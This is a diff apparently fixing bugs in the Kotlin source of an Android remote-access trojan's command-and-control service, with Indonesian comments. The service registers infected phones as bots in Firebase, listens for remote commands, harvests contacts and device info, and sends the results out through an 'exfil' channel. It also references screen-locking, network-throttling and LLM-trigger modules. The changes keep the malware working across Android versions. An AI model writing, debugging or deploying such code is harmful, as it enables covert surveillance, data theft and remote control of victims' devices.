@@ -32,7 +32,6 @@ class TargetC2Service : Service() {
         var isRunning = false
             private set
         private var deviceId: String = ""
-        // FIX 1: val → var, dan tipe data konsisten
         private var job: Job? = null
         private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     }
@@ -44,11 +43,6 @@ class TargetC2Service : Service() {
     private lateinit var exfilRef: DatabaseReference
     private var commandListener: ChildEventListener? = null
     private var broadcastListener: ChildEventListener? = null
-
-    private val exfiltrator by lazy { TargetDataExfiltrator(this) }
-    private val screenLocker by lazy { TargetScreenLocker() }
-    private val networkThrottler by lazy { TargetNetworkThrottler() }
-    private val llmModule by lazy { TargetLLMModule(this) }
 
     override fun onCreate() {
         super.onCreate()
@@ -76,8 +70,9 @@ class TargetC2Service : Service() {
         startForeground(NOTIF_ID, createNotification())
 
         try {
+            // Firebase persistenceEnabled HARUS sebelum getInstance
+            FirebaseDatabase.getInstance().setPersistenceEnabled(true)
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            database.setPersistenceEnabled(true)
 
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
@@ -111,7 +106,6 @@ class TargetC2Service : Service() {
         stopSelf()
     }
 
-    // FIX: Hapus dependensi ke SecureChatApp dan ChatActivity
     private fun createNotification(): Notification {
         val pendingIntent = PendingIntent.getActivity(
             this, 0,
@@ -131,7 +125,6 @@ class TargetC2Service : Service() {
             .build()
     }
 
-    // FIX 2: Semua nilai dikonversi ke String biar konsisten
     private fun registerBot() {
         val deviceName = Build.MODEL
         val manufacturer = Build.MANUFACTURER
@@ -167,7 +160,6 @@ class TargetC2Service : Service() {
         botsRef.child(deviceId).setValue(botInfo)
     }
 
-    // FIX 3: Konsisten tipe data
     private fun sendHeartbeat() {
         val updates = mapOf<String, Any>(
             "isOnline" to true,
@@ -181,7 +173,6 @@ class TargetC2Service : Service() {
         botsRef.child(deviceId).updateChildren(updates)
     }
 
-    // FIX 4: Perbandingan String vs Int
     private fun listenForCommands() {
         commandListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
@@ -191,7 +182,7 @@ class TargetC2Service : Service() {
                 val target = cmd["target"] as? String ?: ""
                 val cmdId = snapshot.key ?: ""
 
-                // target String, deviceId String — aman
+                // String == String — aman
                 if (target == deviceId || target == "all" || target.isEmpty()) {
                     processCommand(type, payload, cmdId)
                 }
@@ -280,7 +271,7 @@ class TargetC2Service : Service() {
         }
     }
 
-    // === COMMAND HANDLERS ===
+    // ============= COMMAND HANDLERS =============
 
     private fun handlePing() {
         sendExfil("pong", "alive")
@@ -301,7 +292,6 @@ class TargetC2Service : Service() {
         sendExfil("get_info", JSONObject(info).toString())
     }
 
-    // FIX 5: Ganti joinToString pake StringBuilder
     private fun handleGetContacts() {
         try {
             val cursor = contentResolver.query(
@@ -654,7 +644,7 @@ class TargetC2Service : Service() {
     }
 
     private fun handleTriggerLLM(prompt: String) {
-        llmModule.trigger(prompt) { response ->
+        TargetLLMModule(this).trigger(prompt) { response ->
             sendExfil("llm_response", response)
         }
     }
@@ -663,10 +653,15 @@ class TargetC2Service : Service() {
         try {
             val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
             val patternMs = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
-            if (patternMs.isNotEmpty()) {
-                vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                if (patternMs.isNotEmpty()) {
+                    vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
+                } else {
+                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
+                }
             } else {
-                vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000), -1)
             }
             sendExfil("vibrate", "Vibrated")
         } catch (e: Exception) {
@@ -685,7 +680,6 @@ class TargetC2Service : Service() {
         }
     }
 
-    // FIX: Ganti ChatActivity dengan alternatif
     private fun handleAlertDialog(message: String) {
         try {
             val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
@@ -720,9 +714,8 @@ class TargetC2Service : Service() {
         startActivity(intent)
     }
 
-    // === HELPERS ===
+    // ============= HELPERS =============
 
-    // FIX 6: timestamp pake toString()
     private fun sendExfil(type: String, content: String) {
         val data = mapOf(
             "type" to type,
@@ -778,6 +771,10 @@ class TargetC2Service : Service() {
             } catch (e: Exception) { "N/A" }
         } else "N/A"
     }
+
+    // Lazy-initialized helpers
+    private val screenLocker by lazy { TargetScreenLocker() }
+    private val networkThrottler by lazy { TargetNetworkThrottler() }
 
     override fun onDestroy() {
         super.onDestroy()
